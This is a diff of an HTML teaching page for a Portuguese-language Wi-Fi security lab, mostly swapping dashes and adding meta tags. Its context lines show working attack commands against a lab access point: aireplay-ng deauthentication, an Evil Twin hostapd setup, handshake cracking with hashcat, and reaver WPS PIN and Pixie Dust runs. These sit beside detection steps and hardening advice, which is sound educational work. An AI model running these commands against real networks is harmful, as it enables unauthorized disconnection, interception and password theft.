@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="author" content="Prof. Dr. Laerte Peotta de Melo">
-<title>Lab 04 — Ataques e Contramedidas | Prof. Dr. Laerte Peotta de Melo</title>
+<title>Lab 04 - Ataques e Contramedidas | Prof. Dr. Laerte Peotta de Melo</title>
 <style>  :root{
     --bg:#010503;--bg2:#031208;--panel:rgba(3,18,9,.82);--panel2:rgba(5,28,13,.72);
     --line:rgba(62,255,132,.22);--line2:rgba(62,255,132,.10);--text:#dcffe8;
@@ -91,6 +91,13 @@
   footer{width:min(calc(100% - 2rem),var(--max));margin:0 auto 2rem;padding:1.2rem;border:1px solid rgba(57,255,122,.13);border-radius:20px;background:rgba(2,12,6,.72);color:var(--muted);text-align:center;font-size:.84rem;}
   @media(max-width:980px){nav{border-radius:24px;}.nav-brand{width:100%;white-space:normal;}.nav-brand span{display:block;margin:.2rem 0 0;}.stats{grid-template-columns:repeat(2,minmax(0,1fr));}.sumario ol{grid-template-columns:repeat(2,minmax(0,1fr));}.link-grid{grid-template-columns:repeat(2,minmax(0,1fr));}}
   @media(max-width:640px){body{font-size:15px;}nav,.hero,.container,footer{width:min(calc(100% - 1rem),var(--max));}.hero,.container{padding:1.25rem;border-radius:22px;}.hero h1{font-size:2rem;}.stats,.sumario ol,.link-grid{grid-template-columns:1fr;}nav a{flex:1 1 auto;text-align:center;}}</style>
+  <meta name="description" content="Lab 04: simulação de ataques a redes Wi-Fi e contramedidas, incluindo Protected Management Frames (PMF).">
+  <link rel="canonical" href="https://peotta.github.io/labs/lab04-ataques.html">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Lab 04 - Ataques e Contramedidas | Prof. Dr. Laerte Peotta de Melo">
+  <meta property="og:description" content="Lab 04: simulação de ataques a redes Wi-Fi e contramedidas, incluindo Protected Management Frames (PMF).">
+  <meta property="og:url" content="https://peotta.github.io/labs/lab04-ataques.html">
+  <meta property="og:image" content="https://peotta.github.io/assets/img/foto-perfil-og.jpg">
 </head>
 <body>
 <canvas id="matrix-rain" aria-hidden="true"></canvas>
@@ -125,14 +132,14 @@
 </div>
 
 <div class="container">
-  <div class="aviso">⚠️ <strong>Aviso legal.</strong> Execute <strong>somente em ambiente de laboratório isolado</strong>, em redes próprias e com autorização explícita. Ataques a redes de terceiros são crime — <strong>Lei 12.737/2012</strong> e <strong>Lei 12.965/2014</strong>. Nunca aplique estas técnicas fora do contexto educacional autorizado.</div>
+  <div class="aviso">⚠️ <strong>Aviso legal.</strong> Execute <strong>somente em ambiente de laboratório isolado</strong>, em redes próprias e com autorização explícita. Ataques a redes de terceiros são crime - <strong>Lei 12.737/2012</strong> e <strong>Lei 12.965/2014</strong>. Nunca aplique estas técnicas fora do contexto educacional autorizado.</div>
 
   <div class="sumario">
     <h2>Sumário</h2>
     <ol>
       <li><a href="#objetivo">Objetivo e ambiente</a></li>
-      <li><a href="#deauth">Ataque DeAuth — desautenticação</a></li>
-      <li><a href="#eviltwin">Evil Twin — Rogue AP</a></li>
+      <li><a href="#deauth">Ataque DeAuth - desautenticação</a></li>
+      <li><a href="#eviltwin">Evil Twin - Rogue AP</a></li>
       <li><a href="#handshake">Captura forçada de handshake</a></li>
       <li><a href="#wps">Ataque WPS PIN</a></li>
       <li><a href="#contramedidas">Contramedidas e hardening</a></li>
@@ -146,7 +153,7 @@
     <h3>Topologia do ambiente</h3>
     <div class="table-wrap"><table>
       <tr><th>Componente</th><th>Configuração</th><th>Papel</th></tr>
-      <tr><td>Access Point de laboratório</td><td>Mercusys MR30G / TP-Link Archer C6</td><td>Alvo dos testes — rede isolada sem Internet</td></tr>
+      <tr><td>Access Point de laboratório</td><td>Mercusys MR30G / TP-Link Archer C6</td><td>Alvo dos testes - rede isolada sem Internet</td></tr>
       <tr><td>Máquina do atacante</td><td>Kali Linux + adaptador Alfa AWUS036ACH</td><td>Executa as ferramentas de auditoria</td></tr>
       <tr><td>Cliente legítimo</td><td>Smartphone Android / notebook</td><td>Simula usuário conectado ao AP</td></tr>
       <tr><td>SSID de laboratório</td><td>Lab-WiFi-Seguro / senha: LabSenha2024!</td><td>Rede de teste com credenciais conhecidas</td></tr>
@@ -155,7 +162,7 @@
   </section>
 
   <section id="deauth">
-    <h2>2. Ataque DeAuth — Desautenticação</h2>
+    <h2>2. Ataque DeAuth - Desautenticação</h2>
     <p>O ataque de desautenticação explora o fato de que, sem PMF (802.11w), frames de gerenciamento não são autenticados. Um atacante pode enviar frames Deauthentication forjados com o endereço MAC do AP, forçando a desconexão de clientes.</p>
     <h3>Mecanismo do ataque</h3>
     <div class="flow">
@@ -197,24 +204,24 @@ aireplay-ng -0 5 -a AA:BB:CC:11:22:33 wlan0mon</code></pre>
     <pre><code><span class="cm"># Kismet alerta automaticamente sobre flood de DeAuth</span>
 kismet -c wlan0 --alert DEAUTHFLOOD,5,1
 
-<span class="cw">[ALERT] DEAUTHFLOOD: 5 DeAuth frames em 1s — possível ataque</span>
+<span class="cw">[ALERT] DEAUTHFLOOD: 5 DeAuth frames em 1s - possível ataque</span>
 
-<span class="cm"># Via Wireshark — filtrar frames DeAuth</span>
+<span class="cm"># Via Wireshark - filtrar frames DeAuth</span>
 wlan.fc.type_subtype == 12
 
 <span class="cm"># Contar DeAuth por origem</span>
 tshark -r captura.pcap -Y "wlan.fc.type_subtype==12"   -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></pre>
     <h3>Contramedida: PMF (802.11w)</h3>
-    <pre><code><span class="cm"># /etc/hostapd/hostapd.conf — habilitar PMF obrigatório</span>
+    <pre><code><span class="cm"># /etc/hostapd/hostapd.conf - habilitar PMF obrigatório</span>
 <span class="cv">ieee80211w=2</span>   <span class="cm"># 2 = obrigatório (Management Frame Protection Required)</span>
 
 <span class="cs"># Resultado com PMF ativo:</span>
 aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c DD:EE:FF:00:11:22 wlan0mon
-<span class="cw">Error: send_deauth — No response. PMF ativo: ataque ineficaz.</span></code></pre>
+<span class="cw">Error: send_deauth - No response. PMF ativo: ataque ineficaz.</span></code></pre>
   </section>
 
   <section id="eviltwin">
-    <h2>3. Evil Twin — Rogue AP</h2>
+    <h2>3. Evil Twin - Rogue AP</h2>
     <p>O ataque Evil Twin cria um AP falso com o mesmo SSID do AP legítimo, em geral com sinal mais forte. O objetivo é fazer o cliente se conectar ao AP falso, permitindo interceptação do tráfego (MITM).</p>
     <h3>Criação de AP falso com hostapd</h3>
     <pre><code><span class="cm"># Criar arquivo de configuração do AP falso</span>
@@ -275,7 +282,7 @@ Tempo: 8m 12s  |  Velocidade: 28.921 chaves/s</span>
 <span class="cm"># Alternativa mais rápida: hashcat com GPU</span>
 hcxtools -i handshake-01.cap -o hash.hc22000
 hashcat -m 22000 hash.hc22000 rockyou.txt
-<span class="cs">Session: Cracked — Velocidade: 2.1 MH/s (RTX 3080)</span></code></pre>
+<span class="cs">Session: Cracked - Velocidade: 2.1 MH/s (RTX 3080)</span></code></pre>
   </section>
 
   <section id="wps">
@@ -292,37 +299,37 @@ reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv --delay 1
 
 <span class="cs">[+] Tentando PIN 12345670...
 [+] Tentando PIN 00005678...</span>
-<span class="cw">[!] Rate limiting detectado — delay aumentado para 5s</span>
+<span class="cw">[!] Rate limiting detectado - delay aumentado para 5s</span>
 <span class="cs">[+] WPS PIN: '87654321'
 [+] WPA PSK: 'LabSenha2024!'</span>
 
-<span class="cm"># Pixie Dust — exploração offline de chips vulneráveis (segundos)</span>
+<span class="cm"># Pixie Dust - exploração offline de chips vulneráveis (segundos)</span>
 reaver -i wlan0mon -b AA:BB:CC:11:22:33 -vv -K 1
 
-<span class="cs">[Pixie-Dust] Nonces capturados — calculando chave offline...
+<span class="cs">[Pixie-Dust] Nonces capturados - calculando chave offline...
 [Pixie-Dust] PIN recuperado em 38 segundos!</span>
 
 <span class="cm"># Contramedida imediata: desabilitar WPS no painel do roteador</span></code></pre>
     <h3>Comparativo dos métodos de ataque ao WPS</h3>
     <div class="table-wrap"><table>
       <tr><th>Método</th><th>Tempo</th><th>Condição</th><th>Contramedida</th></tr>
-      <tr><td>Brute-force PIN</td><td>2–10 horas</td><td>WPS ativo, sem lockout</td><td>Lockout após 3 tentativas + desabilitar WPS</td></tr>
+      <tr><td>Brute-force PIN</td><td>2-10 horas</td><td>WPS ativo, sem lockout</td><td>Lockout após 3 tentativas + desabilitar WPS</td></tr>
       <tr><td>Pixie Dust</td><td>Segundos</td><td>Chip Ralink/Broadcom vulnerável</td><td>Atualizar firmware ou desabilitar WPS</td></tr>
-      <tr><td>PIN estático (padrão)</td><td>Minutos</td><td>PIN padrão do fabricante em uso</td><td>Desabilitar WPS — não existe outra solução eficaz</td></tr>
+      <tr><td>PIN estático (padrão)</td><td>Minutos</td><td>PIN padrão do fabricante em uso</td><td>Desabilitar WPS - não existe outra solução eficaz</td></tr>
     </table></div>
   </section>
 
   <section id="contramedidas">
     <h2>6. Contramedidas e hardening</h2>
     <ul class="check">
-      <li><span class="ok">✓</span><span><strong>Desabilitar WPS</strong> completamente no painel de administração do roteador — a única contramedida eficaz.</span></li>
-      <li><span class="ok">✓</span><span>Habilitar <strong>PMF obrigatório</strong> (ieee80211w=2) — elimina o ataque de DeAuth e protege frames de gerenciamento.</span></li>
-      <li><span class="ok">✓</span><span>Migrar para <strong>WPA3-SAE</strong> — elimina o crack offline de handshake e o ataque PMKID.</span></li>
-      <li><span class="ok">✓</span><span>Usar senha Wi-Fi com <strong>20+ caracteres</strong> aleatórios — torna o dicionário e brute-force computacionalmente inviáveis.</span></li>
-      <li><span class="ok">✓</span><span>Monitorar com <strong>Kismet como IDS</strong> — detecta DeAuth flood, Evil Twin e clientes não autorizados em tempo real.</span></li>
-      <li><span class="ok">✓</span><span>Atualizar <strong>firmware do roteador</strong> regularmente — corrige vulnerabilidades conhecidas no WPS e outros subsistemas.</span></li>
-      <li><span class="nao">✗</span><span>Não confiar em <strong>ocultação de SSID</strong> como segurança — o SSID aparece em probe requests e nas respostas de associação.</span></li>
-      <li><span class="nao">✗</span><span>Não usar <strong>MAC filtering</strong> como única proteção — MACs podem ser facilmente falsificados após observação passiva.</span></li>
+      <li><span class="ok">✓</span><span><strong>Desabilitar WPS</strong> completamente no painel de administração do roteador - a única contramedida eficaz.</span></li>
+      <li><span class="ok">✓</span><span>Habilitar <strong>PMF obrigatório</strong> (ieee80211w=2) - elimina o ataque de DeAuth e protege frames de gerenciamento.</span></li>
+      <li><span class="ok">✓</span><span>Migrar para <strong>WPA3-SAE</strong> - elimina o crack offline de handshake e o ataque PMKID.</span></li>
+      <li><span class="ok">✓</span><span>Usar senha Wi-Fi com <strong>20+ caracteres</strong> aleatórios - torna o dicionário e brute-force computacionalmente inviáveis.</span></li>
+      <li><span class="ok">✓</span><span>Monitorar com <strong>Kismet como IDS</strong> - detecta DeAuth flood, Evil Twin e clientes não autorizados em tempo real.</span></li>
+      <li><span class="ok">✓</span><span>Atualizar <strong>firmware do roteador</strong> regularmente - corrige vulnerabilidades conhecidas no WPS e outros subsistemas.</span></li>
+      <li><span class="nao">✗</span><span>Não confiar em <strong>ocultação de SSID</strong> como segurança - o SSID aparece em probe requests e nas respostas de associação.</span></li>
+      <li><span class="nao">✗</span><span>Não usar <strong>MAC filtering</strong> como única proteção - MACs podem ser facilmente falsificados após observação passiva.</span></li>
     </ul>
     <h3>Gerar senha forte para o AP</h3>
     <pre><code><span class="cm"># Gerar senha de 24 caracteres aleatórios</span>
@@ -345,19 +352,19 @@ tr -dc 'A-Za-z0-9!@#$%^&*' &lt; /dev/urandom | head -c 24; echo
     <div class="link-grid">
       <div class="link-card">
         <div class="lc-label">Lab Anterior</div>
-        <div class="lc-title">Lab 03 — Protocolos WPA2/3</div>
+        <div class="lc-title">Lab 03 - Protocolos WPA2/3</div>
         <div class="lc-desc">Análise do 4-Way Handshake, SAE e PMKID.</div>
         <a class="lc-link" href="lab03-protocolos.html">← Voltar</a>
       </div>
       <div class="link-card">
         <div class="lc-label">Próximo Lab</div>
-        <div class="lc-title">Lab 05 — Ferramentas</div>
+        <div class="lc-title">Lab 05 - Ferramentas</div>
         <div class="lc-desc">Referência completa: Kismet, Aircrack-ng, Reaver e Wifite.</div>
         <a class="lc-link" href="lab05-ferramentas.html">Avançar →</a>
       </div>
       <div class="link-card">
         <div class="lc-label">Norma</div>
-        <div class="lc-title">IEEE 802.11w — PMF</div>
+        <div class="lc-title">IEEE 802.11w - PMF</div>
         <div class="lc-desc">Especificação do Protected Management Frames amendment.</div>
         <a class="lc-link" href="https://standards.ieee.org/ieee/802.11w/4055/" target="_blank">ieee.org ↗</a>
       </div>
